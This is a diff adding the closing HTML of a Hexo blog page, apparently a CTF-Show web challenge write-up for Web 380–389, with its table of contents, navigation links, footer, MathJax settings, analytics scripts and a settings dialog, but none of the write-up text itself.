+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+      
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/11/19/CTF-Show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CTF-Show-萌新计划
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/11/14/%E5%9B%BE/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">图</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="nav-number">1.</span> <span class="nav-text">一、黑盒测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-Web-380"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 Web 380</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-Web-381"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 Web 381</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-Web-382-383"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 Web 382-383</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-Web-384"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 Web 384</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-Web-385"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 Web 385</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-6-Web-386"><span class="nav-number">1.6.</span> <span class="nav-text">1.6 Web 386</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-7-Web-387"><span class="nav-number">1.7.</span> <span class="nav-text">1.7 Web 387</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-8-Web-388"><span class="nav-number">1.8.</span> <span class="nav-text">1.8 Web 388</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-9-Web-389"><span class="nav-number">1.9.</span> <span class="nav-text">1.9 Web 389</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 忆 执 昔 来 的 旅 途 All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/essayists" class="mobile-nav-link">Essayists</a>
+  
+    <a href="/playist" class="mobile-nav-link">Playist</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+
+  
+<script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            忆 执 昔 来 的 旅 途
+          </div>
+          <div class="panel-body">
+            Copyright © 2021 xizhi-future All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
